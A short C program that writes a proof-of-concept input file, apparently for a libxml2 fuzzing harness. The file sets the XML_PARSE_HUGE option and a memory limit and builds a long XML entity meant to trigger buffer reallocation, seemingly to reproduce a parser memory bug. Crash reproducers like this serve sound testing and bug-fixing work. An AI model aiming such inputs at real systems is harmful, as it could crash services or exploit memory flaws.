#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write opts (4 bytes, big-endian, value 0x80000 = XML_PARSE_HUGE) */
    fputc(0x00, f); fputc(0x08, f); fputc(0x00, f); fputc(0x00, f);
    /* Write maxAlloc (4 bytes, big-endian, value 0x10000) */
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0x00, f);

    /* Write URL "test.xml" preceded by backslash */
    fputc('\\', f);
    fwrite("test.xml", 1, 8, f);

    /* Write XML content preceded by backslash */
    fputc('\\', f);
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<!DOCTYPE foo [");
    fprintf(f, "<!ENTITY x \"");
    /* Long entity value to trigger buffer reallocation */
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    fprintf(f, "\">");
    fprintf(f, "]");
    fprintf(f, "<root>&x;</root>");

    /* Terminate with backslash-newline */
    fputc('\\', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}